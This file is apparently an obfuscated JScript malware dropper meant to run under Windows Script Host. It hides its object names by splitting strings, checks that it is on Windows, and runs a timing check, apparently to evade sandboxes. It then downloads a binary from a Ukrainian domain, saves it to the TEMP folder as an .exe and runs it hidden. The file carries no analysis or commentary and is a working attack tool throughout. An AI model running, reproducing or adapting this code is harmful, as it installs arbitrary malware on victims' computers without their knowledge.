var U0 = false;
var B = "Create"+"Object";
var Z = function AF() {return WScript[B]("WScript"+".Shell");}(), EP = 11;
var VW = "MSXML2"+".XMLHTTP";
var O = 2;
var BH = O - 2;
function V(QJ){Z["Run"](QJ, BH, BH);};
function MG(){return VW + "";};
function JP(K, OW){BH = BH * 1; return K - OW;};
function UT(){return B;};
/*@cc_on
  @if (@_win32 || @_win64)
    U0 = true;
  @end
@*/
if (U0)
{
var F = "";
function MF(){return 22;};
var ZU = 0; var J = 0;
function Y()
{
var LQ = new this["Date"]();
var DY = LQ["getUTCMilliseconds"]();
WScript["Sleep"](MF());
var LQ = new this["Date"]();
var GI = LQ["getUTCMilliseconds"]();
WScript["Sleep"](MF());
var LQ = new this["Date"]();
var FN = LQ["getUTCMilliseconds"]();
var ZU = "U";
ZU = JP(GI, DY);
var J = "YO";
J = JP(FN, GI);
F = "open";
return JP(ZU, J);
}
var B0 = false;
var Y0 = false;
for (var N = BH; N < MF() * 1; N++){if (Y() != BH){
B0 = true; 
J = "31" + 11 * ZU + J; 
Y0 = true; 
break;
}}
function I() {return ((B0 == true) && (B0 == Y0)) ? 1 : BH;};
if (B0 && I() && Y0){
function G() {return Z["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "WKZN18e4H9op.ex" + "e";};
 VS = MG();
 R = WScript[B](VS);
 var DX = 1;
do { 
	for (;DX;){
	try {
		if (DX == 1)
		{
			R[F]("GET", "http://greenbee.com.ua/b7eosa", false);
			R["send"]();
			YJ = "Sleep";
			DX = 2;
		}
		WScript[YJ](MF() + 120); 
		if (R["readystate"] < 2 * 2) continue;
		DX = BH;
		function RO(PC) {var IN = (1, 2, 3, 4, 5, PC); return IN;};
		S = WScript[UT()]("ADODB.Stream");
		VS = S;
		VS[F]();
		VS["type"] = RO(1);
		VS["write"](R["ResponseBody"]);
		S["position"] = RO(BH);
		VS["Save" + "ToFile"](G(), 2);
		S["cl"+"ose"]();
		SD = G();
		V(SD);
	} catch(V0){};};
}while (DX);
}
}

